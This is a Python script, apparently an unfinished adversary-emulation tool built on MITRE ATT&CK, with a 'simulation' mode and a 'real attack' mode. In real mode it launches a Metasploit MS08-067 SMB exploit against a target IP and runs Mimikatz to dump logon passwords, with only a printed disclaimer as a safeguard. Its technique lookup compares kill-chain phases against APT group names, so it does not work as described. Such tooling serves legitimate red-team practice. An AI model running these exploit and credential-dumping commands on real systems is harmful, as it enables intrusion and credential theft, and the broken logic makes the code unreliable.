######################################################################################################################################################################################################################
# ###Under Construction### Python adversary emulation simulator, in line with the MITRE ATT&CK Framerwork. sudo python3 mitre_att&ck.py. Requires a linux virtual environment. 
# Performs simulations or real world attacks based on selections. Note: Real world penatration test attack selection will attempt to exploit discovered vulnerabilities based on logic. 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import json
import requests
import time
import os
import subprocess

# MITRE ATT&CK data URL (latest JSON dataset)
ATTACK_DATA_URL = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"

# Disclaimer and Ethical Guidelines
def display_disclaimer():
    print("""
    DISCLAIMER:
    This script is intended for educational purposes only. It is not intended to cause any harm or damage.
    You must have explicit permission from the owner of any system you target with this script.
    Unauthorised testing and exploitation of systems is illegal and unethical.
    Always ensure you have written consent before conducting any security testing.
    """)

# Load MITRE ATT&CK data
def download_attack_data():
    response = requests.get(ATTACK_DATA_URL)
    if response.status_code == 200:
        with open('attack_data.json', 'w') as f:
            f.write(response.text)
        print("[INFO] MITRE ATT&CK data downloaded successfully.")
    else:
        print("[ERROR] Failed to download MITRE ATT&CK data.")
        return None
    return 'attack_data.json'

# Load the APT group and technique data from the ATT&CK JSON file
def load_attack_data(filename='attack_data.json'):
    with open(filename, 'r') as f:
        data = json.load(f)
    return data

# Display available APT groups from the ATT&CK data
def display_apt_groups(data):
    apt_groups = [group['name'] for group in data['objects'] if group['type'] == 'intrusion-set']
    print("Select an APT Group:")
    for i, group in enumerate(apt_groups, 1):
        print(f"{i}. {group}")
    return apt_groups

# Display techniques for the selected APT group
def display_techniques(data, selected_group):
    techniques = []
    for obj in data['objects']:
        if obj['type'] == 'attack-pattern' and 'kill_chain_phases' in obj:
            for phase in obj['kill_chain_phases']:
                if phase['phase_name'] == selected_group:
                    techniques.append(obj['name'])
    print("\nSelect Techniques to simulate:")
    for i, technique in enumerate(techniques, 1):
        print(f"{i}. {technique}")
    return techniques

# Simulate the selected techniques (simulation mode)
def simulate_technique(technique):
    print(f"[INFO] Simulating {technique}...")
    time.sleep(2)  # Simulate execution time
    print(f"[INFO] Simulation for {technique} complete.\n")

# Generate text report for the simulated techniques
def generate_text_report(apt_group, techniques):
    with open(f"{apt_group}_report.txt", 'w') as report_file:
        report_file.write(f"APT Group: {apt_group}\n\n")
        for technique in techniques:
            report_file.write(f"- {technique}\n")
    print(f"[INFO] Report generated: {apt_group}_report.txt")

# Generate HTML report for the simulated techniques
def generate_html_report(apt_group, techniques):
    with open(f"{apt_group}_report.html", 'w') as report_file:
        report_file.write(f"<html><body><h1>APT Group: {apt_group}</h1><ul>\n")
        for technique in techniques:
            report_file.write(f"<li>{technique}</li>\n")
        report_file.write("</ul></body></html>")
    print(f"[INFO] Report generated: {apt_group}_report.html")

# Perform real-world penetration testing (based on techniques and selected APT group)
def perform_real_attack(apt_group, techniques):
    print(f"[INFO] Performing real-world attacks for APT Group: {apt_group}...")
    for technique in techniques:
        print(f"[INFO] Executing attack for technique: {technique}")
        # Logic to exploit techniques
        if "Spearphishing" in technique:
            # Simulate a spearphishing attack (this would require an actual implementation for phishing)
            print("[INFO] Simulating spearphishing attack.")
        elif "Exploitation of Vulnerability" in technique:
            # Exploit a vulnerability (e.g., MS08-067 for SMB)
            print("[INFO] Running Metasploit for MS08-067 SMB exploit.")
            run_metasploit_exploit('windows/smb/ms08_067_netapi', 'RHOST', '<target_ip>')
        elif "Credential Dumping" in technique:
            # Use Mimikatz to dump credentials
            print("[INFO] Running Mimikatz for credential dumping.")
            run_mimikatz()
        else:
            print(f"[INFO] No specific action for technique: {technique}")

# Running Metasploit Exploit
def run_metasploit_exploit(exploit_name, option_name, option_value):
    try:
        print(f"[INFO] Running Metasploit exploit: {exploit_name}")
        msf_command = f"msfconsole -x 'use {exploit_name}; set {option_name} {option_value}; run'"
        subprocess.run(msf_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Error running Metasploit: {e}")

# Running Mimikatz for Credential Dumping
def run_mimikatz():
    try:
        print("[INFO] Running Mimikatz...")
        mimikatz_command = "mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords full'"
        subprocess.run(mimikatz_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Error running Mimikatz: {e}")

# Main function to run the attack simulation or real attack
def run_attack():
    # Display disclaimer
    display_disclaimer()

    # Check if ATT&CK data exists or download it
    if not os.path.exists('attack_data.json'):
        print("[INFO] ATT&CK data not found. Downloading...")
        download_attack_data()
    data = load_attack_data()  # Load the ATT&CK dataset

    # Display available APT groups and let user select
    apt_groups = display_apt_groups(data)
    apt_group_selection = int(input(f"\nEnter selection (1-{len(apt_groups)}): "))
    selected_group = apt_groups[apt_group_selection - 1]
    print(f"[INFO] You selected: {selected_group}")

    # Display techniques for the selected APT group
    techniques = display_techniques(data, selected_group)
    selected_techniques = []
    while True:
        technique_selection = int(input(f"\nSelect a technique (1-{len(techniques)}), or 0 to finish: "))
        if technique_selection == 0:
            break
        selected_technique = techniques[technique_selection - 1]
        selected_techniques.append(selected_technique)

    # Ask for simulation or real attack mode
    mode = input("Select mode (simulation/real): ").strip().lower()
    if mode == 'simulation':
        # Simulate techniques and generate reports
        for technique in selected_techniques:
            simulate_technique(technique)
        report_format = input("Generate report in text or HTML format? (text/html): ").lower()
        if report_format == 'text':
            generate_text_report(selected_group, selected_techniques)
        elif report_format == 'html':
            generate_html_report(selected_group, selected_techniques)
        else:
            print("[ERROR] Invalid report format.")
    elif mode == 'real':
        # Perform real-world penetration testing
        perform_real_attack(selected_group, selected_techniques)
    else:
        print("[ERROR] Invalid mode selected.")

if __name__ == "__main__":
    run_attack()
